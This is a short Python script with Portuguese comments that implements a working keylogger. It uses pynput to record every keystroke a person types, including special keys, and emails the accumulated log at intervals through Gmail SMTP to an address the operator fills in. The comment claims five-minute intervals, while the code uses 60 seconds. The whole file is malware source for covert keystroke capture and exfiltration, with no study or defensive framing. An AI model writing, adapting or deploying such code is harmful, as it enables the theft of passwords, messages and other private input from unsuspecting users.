#Bibliotecas
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

#Defineção da variável de log
log = ""

#Configurações do Email
EMAIL_ORIGEM = ""
SENHA_EMAIL = ""
EMAIL_DESTINO = ""

#Função para enviar o log por email
def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'Log do Keylogger'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO    
        
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar email:", e)

        log = ""

    #Agendar o próximo envio em 5 minutos
    Timer(60, enviar_email).start()

#Função para capturar as teclas pressionadas

def on_press(key):
    global log
    try:
        #Se for tecla normal (letras, números, símbolos)
        log += key.char
    except AttributeError:
        #Se for tecla especial
            if key == keyboard.Key.space:
                log +=" "
            elif key == keyboard.Key.enter:
                log +="\n"
            elif key == keyboard.Key.tab:
                log +="\t"
            elif key == keyboard.Key.backspace:
                log +="[BACKSPACE]"
            elif key == keyboard.Key.delete:
                log +="[DELETE]"
            elif key == keyboard.Key.esc:
                log +="[ESC]"
            else: 
                pass #Ignorar essas teclas

#Iniciar o listener de teclado
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()  # Iniciar o envio periódico de emails
    listener.join()
